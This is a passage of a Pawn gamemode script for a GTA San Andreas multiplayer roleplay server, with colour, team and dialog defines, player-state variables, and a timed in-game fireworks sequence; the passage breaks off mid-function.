/*
 ______                                           ____                ____      
/\  _  \                  __                     /\  _`\             /\  _`\    
\ \ \L\ \     ___ ___    /\_\    _ __            \ \ \L\ \   __  __  \ \ \L\_\  
 \ \  __ \  /' __` __`\  \/\ \  /\`'__\           \ \  _ <' /\ \/\ \  \ \ \L_L  
  \ \ \/\ \ /\ \/\ \/\ \  \ \ \ \ \ \/             \ \ \L\ \\ \ \_\ \  \ \ \/, \
   \ \_\ \_\\ \_\ \_\ \_\  \ \_\ \ \_\              \ \____/ \ \____/   \ \____/
    \/_/\/_/ \/_/\/_/\/_/   \/_/  \/_/   _______     \/___/   \/___/     \/___/ 
                                        /\______\                               
                                        \/______/                           
*/
/*--------------------------------**INCLUDES**--------------------------------*/
#include                            <a_samp>
#include                            <a_actor>
#undef                              MAX_PLAYERS
#define                             MAX_PLAYERS                              200
#undef                              MAX_VEHICLES
#define                             MAX_VEHICLES                            2000
#define                             FIXES_Single                               1
#define                             FIX_file_inc                               1
#define                             FIX_GetPlayerColor                         1
#define                             FIX_SpawnPlayer                            1
#define                             FIX_SetPlayerName                          1
#define                             FIX_GetPlayerSkin                          1
#define                             FIX_GetWeaponName                          1
#define                             FIX_TogglePlayerControllable               1
#define                             FIX_IsPlayerInCheckpoint                   1
#define                             FIX_IsPlayerInRaceCheckpoint               1
#define                             FIX_GetPlayerWeapon                        1
#define                             FIX_PutPlayerInVehicle                     1
#define                             FIX_KEY_AIM                                1
#define                             KEY_AIM                                   {128}
#define                             FIX_SetPlayerCheckpoint                    1
#define                             FIX_SetPlayerRaceCheckpoint                1
#define                             FIX_TextDrawCreate                         1
#define                             FIX_TextDrawSetString                      1
#define                             FIX_AllowInteriorWeapons                   1
#define                             FIX_OnPlayerEnterVehicle                   1
#define                             FIX_SetPlayerSpecialAction                 1
#define                             FIX_OnDialogResponse                       1
#define                             FIX_SetSpawnInfo                           1
#define                             FIX_SetPlayerSkin                          1
#define                             FIX_valstr                                 1
#define                             FIX_IsPlayerAttachedObjectSlotUsed         1
#define                             FIX_SetPlayerAttachedObject                1
#define                             FIX_OnPlayerDeath                          1
#define                             FIX_strins                                 1
#define                             FIX_IsPlayerConnected                      1
#define                             FIX_TrainExit                              1
#define                             FIX_Kick                                   1
#define                             FIX_OnVehicleMod                           1
#define WHITE_HEX {FFFFFF}
#define COLOUR_WHITE 0xFFFFFFAA
#define COLOUR_RED 0xFF0000FF
#define NEON_DIALOG 11967
#define BLUE_NEONS_PRICE 100
#define RED_NEONS_PRICE 100
#define GREEN_NEONS_PRICE 100
#define YELLOW_NEONS_PRICE 100
#define PINK_NEONS_PRICE 100
#define MAX_ROADBLOCKS   85
#include                            <fixes>
#include                            <utils>
#include                            <streamer>
#include                            <a_mysql>
#include                            <libRegEx>
#include                            <crashdetect>
#include                            <FileFunctions>
/*----------------------------------------------------------------------------*/
#pragma                             tabsize                                    0
#pragma                             semicolon                                  0
static                              akharinvehicle =                        709;
new bool:IsLogedIn[MAX_PLAYERS];
new bool:IsAtTelePhoneSabet[MAX_PLAYERS];
new AgeBarDasht[MAX_PLAYERS];
new Sherkat[MAX_PLAYERS][5];
new actor,actor1,actor2,actor3;
new Text:pmodel[MAX_PLAYERS];
new Text:wtd[11];
new hasan8;
new vinewoodgate;
new Text:jtxd[MAX_PLAYERS][7];
new Text:atxd[9];
new vinewoodgate1;
new bool:OnFirstSpawn[MAX_PLAYERS];
new jscar[10];
new MLR,
MMLR,
RMLR,
LMLR,
PMLR;
new preveh[10];
new gr[MAX_PLAYERS];
new gvehg;
new Gname[MAX_PLAYERS];
new Trash[10];
new TrashKhalie[10];
new Surfing[MAX_PLAYERS];
new PlayerText:IntroTD[43][MAX_PLAYERS];
new  Text:WarBox,
	   PlayerText:WarST,
	   Text:WarA[50],
	   Text:WarD[50],
	   PlayerText:WarS,
	   PlayerText:WarDea,
	   Text:WarVS,
	   PlayerText:WarK,
	   //Text:WarT[MAX_PLAYERS],
	   Text:WarTR[50];
new bool:IsPlayerBankCheckpoint[MAX_PLAYERS];
new PlayerText:TDEditor_PTD[MAX_PLAYERS][1];
new Text3D:NPCTextBlue;
new Text3D:NPCTextBlack;

new BusID[MAX_PLAYERS];
new BusCost[MAX_PLAYERS];
new PlayerSitting[MAX_PLAYERS];
new Float:Playerx[MAX_PLAYERS], Float:Playery[MAX_PLAYERS], Float:Playerz[MAX_PLAYERS], Float:Playera[MAX_PLAYERS], PlayerSkin[MAX_PLAYERS];
new costtimer;
new bool:Bio[MAX_PLAYERS];
//---------------
new pIntro[MAX_PLAYERS];
new Text:IntroText1[2];
new Text:IntroText2[2];
new Text:IntroText3[31];
new Text:IntroText4[38];
new Text:IntroText5[37];
new Text:IntroText6[34];
new Text:IntroText7[34];
new Text:IntroText8[31];
new Text:IntroText9[30];
new Text:IntroText10[3];
new DoneCam[MAX_PLAYERS];
new Float:camx[MAX_PLAYERS];
new Float:camy[MAX_PLAYERS];
new Float:camz[MAX_PLAYERS];
forward UpdatePlayerIntro(playerid);
forward fs(playerid);
/*-----------------------------**DealerShip System**-------------------------------*/

/*-----------------------------**MySQL System**-------------------------------*/
#define								sqluser								"root"
#define								sqlpass								""
#define								sqlhost								"localhost"
#define								sqldb								"amir"
/*---------------------------**DEFINES(COLORS)**------------------------------*/
#define strcpyy(%0,%1,%2) strcat((%0[0] = '\0', %0), %1, %2)
#define                             COLOR_AdminWarn                   0xD0000FFF
#define                             COLOR_YouAreNotAdmin              0xF9F7CEFF
#define                             COLOR_PlayerNotConnected          0x33AA33AA
#define                             COLOR_LIGHTGREENN                 0x00FF00FF
#define                             COLOR_ALI                         0xFF4500FF
#define                             COLOR_BAN                         0xA9C4E400
#define                             COLOR_BANTEXT                     0xB5C5BB00
#define                             COLOR_LIGHTRED                    0xFF6347AA
#define                             COLOR_ASKQ                        0xFF0000FF
#define                             COLOR_1BLUE                       0x0099FFFF
#define                             COLOR_AFK                         0x8C8C8C00
#define                             COLOR_JOB                         0x00FFFFFF
#define                             COLOR_HOUSED                      0x00FFFFFF
#define                             COLOR_BIZ                         0x0000FFFF
#define                             COLOR_GRAD1                       0xB4B5B7FF
#define                             COLOR_GRAD2                       0xBFC0C200
#define                             COLOR_GRAD3                       0xCBCCCEFF
#define                             COLOR_GRAD4                       0xD8D8D8FF
#define                             COLOR_GRAD5                       0xE3E3E3FF
#define                             COLOR_GRAD6                       0xF0F0F0FF
#define                             COLOR_AMIR                        0xFF4500FF
#define                             COLOR_MAMAD                       0x00FF00FF
#define PRESSED(%0) \
	(((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define                             COLOR_DEPART2                     0xFF6347AA
#define                             COLOR_CRS1                        0xF2F2F2FF
#define                             COLOR_CRS2                        0xE6E6E6FF
#define                             COLOR_CRS3                        0xD8D8D8FF
#define                             COLOR_CRS4                        0xBDBDBDFF
#define                             COLOR_CRS5                        0xA4A4A4FF
#define                             COLOR_EVENT                       0x7189BCFF
#define                             COL_SYN                           0xA9C4E400
#define                             COLOR_Good                        0xb8ffdbFF
#define                             COLOR_GREY                        0x5D7E8DAA
#define                             COLOR_GREEN                       0x33AA33AA
#define                             COLOR_RED                         0xAA3333AA
#define                             COLOR_NewsNR                      0xffa500FF
//#define COLOR_REDXX		0xFF0000FF
new pNoFind[MAX_PLAYERS];
new CanUseDrug[MAX_PLAYERS];
#define                             COLOR_LIGHTBLUE                   0x33CCFFAA
#define                             COLOR_LIGHTGREEN                  0xC6FC31FF
#define                             COLOR_HOUSE                		  0x00E600FF
#define                             COLOR_YELLOW                      0xFFFF00FF
#define                             COLOR_YELLOW2                     0xF9F7CEFF
#define                             COLOR_WHITE                       0xFFFFFFFF
#define                             COLOR_FADE1                       0xE6E6E6E6
#define                             COLOR_FADE2                       0xC8C8C8C8
#define                             COLOR_FADE3                       0xAAAAAAAA
#define                             COLOR_FADE4                       0x8C8C8C8C
#define                             COLOR_FADE5                       0x6E6E6E6E
#define                             COLOR_PURPLE                      0xC2A2DAAA
#define                             COLOR_DBLUE                       0x2641FEAA
#define                             COLOR_ALLDEPT                     0xFF8282AA
#define                             COLOR_NEWS                        0x825B8CFF
#define                             CRISTIAN                          0x0DC013AA
#define                             CRISTIAN1                         0xF21717AA
#define                             COLOR_TUT96                       0xFFFFFFFF
#define                             COLOR_Jooje                       0xFFFF00FF
#define                             COLOR_OOC                         0xB1C8FBAA
#define                             COLOR_visit                       0xFF0000FF
#define                             COLOR_StormMen                    0x00ECECFF
#define                             COLOR_TopBoys                     0xfff47fFF
#define                             COLOR_SFPD                        0x60F56500
#define                             COLOR_GG                          0xE04343FF
#define                             TEAM_HIT_COLOR                    0xFFFFFF00
#define                             TEAM_BLUE_COLOR                   0x8D8DFF00
#define                             TEAM_DangerousTigers_COLOR        0x00D900C8
#define                             TEAM_AZTECAS_COLOR                0x01FCFFC8
#define                             COLOR_StormMen                    0x00ECECFF
#define                             TEAM_CYAN_COLOR                   0xFF8282AA
#define                             TEAM_CUN_COLOR                    0x5D7E8DFF
#define                             ADVERTISEMEN_COLOR                0x18E139FF
#define                             COLOR_LegendaryMen                0xFFBA00FF
#define                             COLOR_DangerousTigers             0x19AF23FF
#define                             COLOR_HITMAN                      0x8E2323FF
#define                             COLOR_FNF                         0xB32CF6FF
#define                             COLOR_TCC                         0xF9F7CEFF
#define                             COLOR_STAFF                       0xFF0000FF
#define                             COLOR_TT                          0xB5AB6DFF
#define                             COLOR_EVIL                        0xD1B4DBFF
#define                             COLOR_GGC                         0x9a9a9aFF
#define                             COLOR_MAYOR                       0xBBF060FF
#define                             COLOR_MAFIA                       0x000000FF
#define                             COLOR_CHICHAGO                    0x5D7E8DFF
#define                             COLOR_TheKillers                  0x3E3535FF
#define                             COLOR_MEDIC                       0xFF450000
#define                             COLOR_PD                          0x2900FF00
#define                             COLOR_FBI                         0x2900FF00
#define                             COLOR_NG                          0x00008000
#define                             COLOR_SI                          0x0974C600
#define                             COLOR_TAXI                        0xFFFF0000
#define                             COLOR_BLUE                        0x2641FEAA
#define                             COLOR_ROUZ                        0x00FF00FF
#define                             COL_LegendaryMen                  "{F3A32A}"
#define                             COL_DangerousTigers               "{19AF23}"
#define                             COL_StormMen                      "{00ECEC}"
#define                             COL_HITMAN                        "{AF1919}"
#define                             COL_FNF                           "{B32CF6}"
#define                             COL_TCC                           "{F9F7CE}"
#define                             COL_STAFF                         "{57e547}"
#define                             COL_TT                            "{B5AB6D}"
#define                             COL_EVIL                          "{D1B4DB}"
#define                             COL_GG                            "{9a9a9a}"
#define                             COL_MAYOR                         "{BBF060}"
#define                             COL_CHICHAGO                      "{5D7E8D}"
#define                             COL_TheKillers                    "{4F4F4F}"
#define                             COL_MEDIC                         "{F2926F}"
#define                             COL_PD                            "{6F9BF2}"
#define                             COL_FBI                           "{4179E9}"
#define                             COL_NG                            "{466FC0}"
#define                             COL_SI                            "{0974C6}"
#define                             COL_SFPD                          "{60F565}"
#define                             COL_CRS1                          "{F2F2F2}"
#define                             COL_CRS2                          "{E6E6E6}"
#define                             COL_CRS3                          "{D8D8D8}"
#define                             COL_CRS4                          "{BDBDBD}"
#define                             COL_CRS5                          "{A4A4A4}"
#define PROPERTY_OFFSET(%0) \
    ((((%0) * ((%0) << 1)) << 2) + 65536)
/*-------------------------**OTHER DEF**--------------------------------------*/
#define                             DIALOG_DJ                   1910
#define								DIALOG_ASANSOR				1911
#define								DIALOG_KHARID				1912
#define								DIALOG_ORDER				1913
#define								DIALOG_ORDER2				33429240
#define                             DIALOG_FFNN                                1919
#define								DIALOG_NEON					1914
#define								DIALOG_SHOWWANTED			1915
#define 							DIALOG_BANK_LIST            1023
#define 							DIALOG_BANK_WITHDRAW        1022
#define 							DIALOG_BANK_DEPOSIT         1021
#define                             AdminWarnMSG                "[ADM-Warn]: "
#define                             SCM                        SendClientMessage
#define                             SendMessage                        SendClientMessage
#define                             Akharish                        LastPID
#define                             PISSING                                   68
#define                             PRESSED(%0)                                (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define                             gTeam[%0]                   PINFO[%0][pTeam]
#define                             Public:%0(%1)                              forward %0(%1);public %0(%1)
#define                             TEAM_CIV                                   0
#define                             TEAM_COP                                   1
#define                             TEAM_MEDIC                                 2
#define                             TEAM_FAMILY                                3
#define                             TEAM_SM                          TEAM_FAMILY
#define                             TEAM_KM                          TEAM_FAMILY
#define                             TEAM_HITMAN                                4
#define                             TEAM_NEWS                                  5
#define                             TEAM_TAXI                                  6
#define                             TEAM_SI                                    7
#define                             TEAM_DangerousTigers                     TEAM_FAMILY
//#define                             turf                              AttackTurfs
#define                             TEAM_LegendaryMen                TEAM_FAMILY
#define                             TEAM_FNF                    TEAM_FAMILY
#define                             TEAM_TopBoys                     TEAM_FAMILY
#define                             TEAM_StormMen                    TEAM_FAMILY
#define                             TEAM_TOW                                   8
#define                             TEAM_STAFF                                 17
#define                             TEAM_TT                    TEAM_FAMILY
#define                             TEAM_EVIL                    TEAM_FAMILY
#define                             TEAM_GG                    TEAM_FAMILY
#define                             PlayerNotConnectedMSG                      "Error: Player isn't connected."
#define                             YouAreNotAdminMSG                          "Error: You are not an admin."
#define                             DefaultInsurance                           5
#define                             PTP                            PlayerToPoint
#define                             IsPlayerSwimming             IsPlayerInWater
#define                             VEHICLE_PARAMS_OFF                         0
#define                             VEHICLE_PARAMS_ON                          1
#define                             KEY_ANALOG_UP                         (2048)
#define                             KEY_ANALOG_DOWN                       (4096)
#define                             KEY_ANALOG_RIGHT                     (16384)
#define                             KEY_ANALOG_LEFT                       (8192)
#define                             GasMax                                   100
#define                             RefuelWait                              5000
#define                             WantedAFKTime                     10 //Minute
#define                             AFKTimeOnSV                      30 //Minute
#define                             PINFO[%0][%1]   PlayerInfo[%0][%1]//:D ;) =D
#define                             MAX_ZONE_NAME                             28
#define                              SPC                                       SetPlayerCheckpoint
new Mhmoney[MAX_PLAYERS];
new Mhmats[MAX_PLAYERS];
new AC_pWeapons[MAX_PLAYERS][50];
new vhcolor1[MAX_PLAYERS];
new vhcolor2[MAX_PLAYERS];
new pwantmat[MAX_PLAYERS];
new Text:TD_PlayerName[MAX_PLAYERS];
new Text:SafeZone[MAX_PLAYERS];
new SafeZoneCheck[MAX_PLAYERS];
new SafeOn;
new Text:TD_PayDay[MAX_PLAYERS][4];
new Neon[MAX_PLAYERS];
new Float:ZAng[MAX_PLAYERS];
new Neons[MAX_PLAYERS][24];
new Text:shacklog[MAX_PLAYERS];
 new mpop[MAX_PLAYERS];
// new objected[MAX_PLAYERS];
 // Atish Bazi

 enum Random
{
        Float:RX,
        Float:RY,
        Float:RZ
}
new shealdare[MAX_PLAYERS];
new created[MAX_VEHICLES];
new idss[MAX_PLAYERS];
new sprice[MAX_PLAYERS];
//new neonsx[MAX_VEHICLES];
new Float:pPosX[MAX_PLAYERS];
new AirTime[MAX_PLAYERS];
new Float:pPosY[MAX_PLAYERS];
new Float:pPosZ[MAX_PLAYERS];
//new Strikes[35][Random]; // Max Random strike zones = 35. Add you own if you like.
new Float:vHealth[MAX_VEHICLES] =1000.0;
new VehModKharid[MAX_PLAYERS];
new vhid[MAX_PLAYERS];
new OnTestMashine[MAX_PLAYERS];
new Airstriking[MAX_PLAYERS];
new pNoAFK[MAX_PLAYERS];
new HaveJetpack[MAX_PLAYERS];
new OnFreeze[MAX_PLAYERS];
new Airstrike[MAX_PLAYERS];
new Timer[MAX_PLAYERS];
new Flare[MAX_PLAYERS];
new BusVeh[16];
new MedVeh[12];
new MCHVeh[3];
new SLVeh[6];
new LMVeh[30];
new ProdsVeh[4];
new FNFVeh[36];
new SilVeh[27];
new DTVeh[33];
new TKVeh[43];
new TruckVeh[27];
new NewsVeh[14];
new RentVeh[29];

new Text:TestModel[MAX_PLAYERS];
new Text:BuyModel[MAX_PLAYERS];
new Text:NextModel[MAX_PLAYERS];
new Text:PrevModel[MAX_PLAYERS];
new Text:RotModel[MAX_PLAYERS];
new Text:RotModel2[MAX_PLAYERS];
new PlayerText:CarModel[MAX_PLAYERS];
new PlayerText:PriceModel[MAX_PLAYERS];
new Text:ExitDS[MAX_PLAYERS];

new FarmerVeh[22];
new MayorVeh;
new NGVeh[25];
new CopLSVeh[39];
new CopSFVeh[53];
new GarbageVeh[9];
new FBIVeh[15];
new TaxVeh[19];
new HitVeh[24];
new objDD[MAX_PLAYERS];
new Hyd[MAX_PLAYERS];
new TearGas[MAX_PLAYERS];
new Dayer1[MAX_PLAYERS];
new Dayer2[MAX_PLAYERS];
new Dayer3[MAX_PLAYERS];
new Dayer4[MAX_PLAYERS];
new Dayer12[MAX_PLAYERS];
new Dayer22[MAX_PLAYERS];
new Dayer32[MAX_PLAYERS];
new Dayer42[MAX_PLAYERS];
new Dayer13[MAX_PLAYERS];
new Dayer23[MAX_PLAYERS];
new Dayer33[MAX_PLAYERS];
new Dayer43[MAX_PLAYERS];
new Text:TDPinCode[MAX_PLAYERS][27];
new PlayerRamz[MAX_PLAYERS];
new PlayerRamzing[MAX_PLAYERS];
new AccountLock[MAX_PLAYERS];
new Dayer14[MAX_PLAYERS];
new Dayer24[MAX_PLAYERS];
new Dayer34[MAX_PLAYERS];
new Dayer44[MAX_PLAYERS];
new Dayer15[MAX_PLAYERS];
new Dayer25[MAX_PLAYERS];
new IsPlayerSpawnedForMessage[MAX_PLAYERS];
new Dayer35[MAX_PLAYERS];
new Dayer45[MAX_PLAYERS];
new Dood[MAX_PLAYERS];
new Balon[MAX_PLAYERS];
new Balon2[MAX_PLAYERS];
new Text:TD_ConnectUp[3];
new Text:TD_pConnectUp[MAX_PLAYERS];
new TextDrawSize[MAX_PLAYERS];
new TimerTD[MAX_PLAYERS];
new Payambar[MAX_PLAYERS];
new bool: isRelogging[MAX_PLAYERS], relogPlayerIP[MAX_PLAYERS][17];
new InModShop[MAX_PLAYERS];
new ModShopS[MAX_PLAYERS];
new pSexx[MAX_PLAYERS];
new CCID[MAX_PLAYERS];
new NameClan[MAX_PLAYERS][512];
new TagClan[MAX_PLAYERS][512];
new ColorClan[MAX_PLAYERS][512];
new CBB[MAX_PLAYERS];
new RRP[MAX_PLAYERS];
new RRG[MAX_PLAYERS];
new CMP[MAX_PLAYERS];
new CMG[MAX_PLAYERS];
new PPG[MAX_PLAYERS];
new PPD[MAX_PLAYERS];
new PPA[MAX_PLAYERS];
new Raft[MAX_PLAYERS];
new OnMashinKharidan[MAX_PLAYERS];
new EnableBoast[MAX_PLAYERS];
new EnableBrake[MAX_PLAYERS];
new rV[MAX_PLAYERS];
new roV[MAX_PLAYERS];


/*-------------------------------**FORWARDS**---------------------------------*/






//Atish Bazi
Public:AirstrikeGo(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
			//Balon2[playerid] = CreateObject(19338,x,y,z-0.5,0.000000,0.000000,0.000000);
			Balon[playerid] = CreateObject(19338,x,y,z+30,0.000000,0.000000,0.000000);
			MoveObject(Balon[playerid], x, y+300, z+400, 3);
			//MoveObject(Balon2[playerid], x, y+40, z+32, 7);
			Dood[playerid] = CreateObject(354,x,y,z-1,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer1[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer1[playerid], x-17, y, z+30, 5);
			Dayer2[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer2[playerid], x+17, y, z+30, 5);
			Dayer3[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer3[playerid], x, y-17, z+30, 5);
			Dayer4[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer4[playerid], x, y+17, z+30, 5);

            Airstriking[playerid] = 19;
            KillTimer(Timer[playerid]);
            CreateExplosion(x-20,y,z+30,6,2);

        SetTimerEx("AirstrikeGo2",2000,false,"dfffd",playerid,x,y,z,19);
        }
      if(type == 20)
        {
			Balon2[playerid] = CreateObject(19338,x,y,z-0.5,0.000000,0.000000,0.000000);
			//Balon[playerid] = CreateObject(19338,x,y,z+30,0.000000,0.000000,0.000000);
			//MoveObject(Balon[playerid], x, y+300, z+400, 3);
			MoveObject(Balon2[playerid], x, y+40, z+32, 7);
			Dood[playerid] = CreateObject(354,x,y,z-1,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer1[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer1[playerid], x-17, y, z+30, 5);
			Dayer2[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer2[playerid], x+17, y, z+30, 5);
			Dayer3[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer3[playerid], x, y-17, z+30, 5);
			Dayer4[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer4[playerid], x, y+17, z+30, 5);

            Airstriking[playerid] = 20;
            KillTimer(Timer[playerid]);
            CreateExplosion(x-20,y,z+30,6,2);

        SetTimerEx("AirstrikeGo2",2000,false,"dfffd",playerid,x,y,z,20);
        }
        if(type == 2)
        {

    CreateExplosion(x,y-2,z,1,10);
    for(new i = 0; i < MAX_PLAYERS; i++)
        {
                        DestroyObject(TearGas[i]);
                        DestroyObject(Flare[i]);
						DestroyObject(Hyd[i]);
						KillTimer(Timer[i]);
        }

		}
    Airstrike[playerid] = 0;
    Airstriking[playerid] = 0;
        return 1;
}
Public:AirstrikeGo2(playerid,Float:x,Float:y,Float:z,type)
{
		        if(type == 19)
        {
		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer1[i]);
			DestroyObject(Dayer2[i]);
			DestroyObject(Dayer3[i]);
			DestroyObject(Dayer4[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);
            CreateExplosion(x+2,y+6,z+30,6,5);
            SetTimerEx("AirstrikeGo3",2000,false,"dfffd",playerid,x,y,z,19);
        }
		        if(type == 20)
        {
		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer1[i]);
			DestroyObject(Dayer2[i]);
			DestroyObject(Dayer3[i]);
			DestroyObject(Dayer4[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);
            CreateExplosion(x+2,y+6,z+30,6,5);
            SetTimerEx("AirstrikeGo3",2000,false,"dfffd",playerid,x,y,z,20);
        }
        if(type == 101)
        {
            Airstriking[playerid] = 0;
            KillTimer(Timer[playerid]);
            CreateExplosion(1326.31482+1,-825.35059-30,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo3",1000,false,"dfffd",playerid,x,y,z,101);
        }
        Airstrike[playerid] = 0;
    Airstriking[playerid] = 0;
        return 1;
}
Public:AirstrikeGo3(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

            CreateExplosion(x-10,y-10,z+30,6,5);
			Dayer12[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer12[playerid], x-17, y, z+30, 5);
			Dayer22[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer22[playerid], x+17, y, z+30, 5);
			Dayer32[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer32[playerid], x, y-17, z+30, 5);
			Dayer42[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer42[playerid], x, y+17, z+30, 5);

            SetTimerEx("AirstrikeGo4",2000,false,"dfffd",playerid,x,y,z,19);


		}
        if(type == 20)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

            CreateExplosion(x-10,y-10,z+30,6,5);
			Dayer12[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer12[playerid], x-17, y, z+30, 5);
			Dayer22[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer22[playerid], x+17, y, z+30, 5);
			Dayer32[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer32[playerid], x, y-17, z+30, 5);
			Dayer42[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer42[playerid], x, y+17, z+30, 5);

            SetTimerEx("AirstrikeGo4",2000,false,"dfffd",playerid,x,y,z,20);


		}
		if(type == 101)
        {
            Airstriking[playerid] = 0;
            KillTimer(Timer[playerid]);
			CreateExplosion(1326.31482-5,-825.35059+50,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo4",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo4(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer12[i]);
			DestroyObject(Dayer22[i]);
			DestroyObject(Dayer32[i]);
			DestroyObject(Dayer42[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);
            CreateExplosion(x,y+8,z+30,6,5);
            SetTimerEx("AirstrikeGo5",2000,false,"dfffd",playerid,x,y,z,19);

        }
        if(type == 20)
        {
		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer12[i]);
			DestroyObject(Dayer22[i]);
			DestroyObject(Dayer32[i]);
			DestroyObject(Dayer42[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);
            CreateExplosion(x,y+8,z+30,6,5);
            SetTimerEx("AirstrikeGo5",2000,false,"dfffd",playerid,x,y,z,20);

        }
		if(type == 101)
        {
            CreateExplosion(1375.81018,-808.06812+8,76.70108+30,6,2);
			SetTimerEx("AirstrikeGo5",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo5(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);

			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer13[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer13[playerid], x-17, y, z+30, 5);
			Dayer23[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer23[playerid], x+17, y, z+30, 5);
			Dayer33[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer33[playerid], x, y-17, z+30, 5);
			Dayer43[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer43[playerid], x, y+17, z+30, 5);

            CreateExplosion(x+1,y+10,z+30,6,5);
            SetTimerEx("AirstrikeGo6",2000,false,"dfffd",playerid,x,y,z,19);

        }
      if(type == 20)
        {
		for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);

			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			Dayer13[playerid] = CreateObject(19295,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer13[playerid], x-17, y, z+30, 5);
			Dayer23[playerid] = CreateObject(19296,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer23[playerid], x+17, y, z+30, 5);
			Dayer33[playerid] = CreateObject(19297,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer33[playerid], x, y-17, z+30, 5);
			Dayer43[playerid] = CreateObject(19298,x,y+5,z+30,0.000000,0.000000,0.000000);
			MoveObject(Dayer43[playerid], x, y+17, z+30, 5);

            CreateExplosion(x+1,y+10,z+30,6,5);
            SetTimerEx("AirstrikeGo6",2000,false,"dfffd",playerid,x,y,z,20);

        }
		if(type == 101)
        {
            CreateExplosion(1326.31482+1,-825.35059+10,70.26804+30,6,2);
			SetTimerEx("AirstrikeGo6",1000,false,"dfffd",playerid,x,y,z,101);
        }
        return 1;
}
Public:AirstrikeGo6(playerid,Float:x,Float:y,Float:z,type)
{
        if(type == 19)
        {

		    for(new i = 0; i < MAX_PLAYERS; i++)
        {
			DestroyObject(Dood[i]);
			DestroyObject(Dayer13[i]);
			DestroyObject(Dayer23[i]);
			DestroyObject(Dayer33[i]);
			DestroyObject(Dayer43[i]);
			}
			Dood[playerid] = CreateObject(354,x,y,z-2,0.000000,0.000000,0.000000);
			MoveObject(Dood[playerid], x, y+5, z+30, 15);

			CreateExplosion(x-2,y,z+30,6,5);
